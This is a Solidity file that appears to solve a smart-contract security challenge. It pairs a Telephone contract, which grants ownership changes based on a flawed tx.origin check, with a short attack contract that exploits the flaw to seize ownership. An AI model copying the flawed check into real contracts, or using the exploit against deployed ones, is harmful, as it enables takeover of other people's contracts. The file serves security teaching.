// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract attack {
    Telephone phone;

    constructor(address _phone) {
        phone = Telephone(_phone);
    }

    function attacker(address _owner) external {
        phone.changeOwner(_owner);
    }
}